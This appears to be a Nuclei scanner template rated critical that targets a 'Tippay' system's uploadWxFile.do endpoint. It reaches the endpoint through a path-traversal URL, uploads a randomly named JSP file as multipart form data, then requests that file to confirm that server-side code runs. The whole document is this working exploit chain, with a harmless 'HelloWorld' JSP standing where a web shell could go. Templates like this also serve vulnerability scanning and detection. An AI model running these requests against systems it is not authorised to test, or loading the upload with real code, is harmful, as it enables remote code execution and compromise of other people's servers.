id: Tippay-uploadWxFile-UploadToRCE

info:
  name: Tippay-uploadWxFile-UploadToRCE
  author: iSee857
  severity: critical
  description: |
    Tippay-uploadWxFile-UploadToRCE

variables:
  filename: "{{randstr}}"

http:
  - raw:
      - |
        POST /trwfe/service/.%2E/config/uploadWxFile.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryFfJZ4PlAZBixjELj
        Accept-Encoding: gzip

        --WebKitFormBoundaryFfJZ4PlAZBixjELj
        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
        Content-Type: application/vnd.ms-excel

        <% out.println("HelloWorld");%>
        --WebKitFormBoundaryFfJZ4PlAZBixjELj--

    matchers:
      - type: word
        part: body
        words:
          - "true"

  - raw:
      - |
        GET /{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - "HelloWorld"
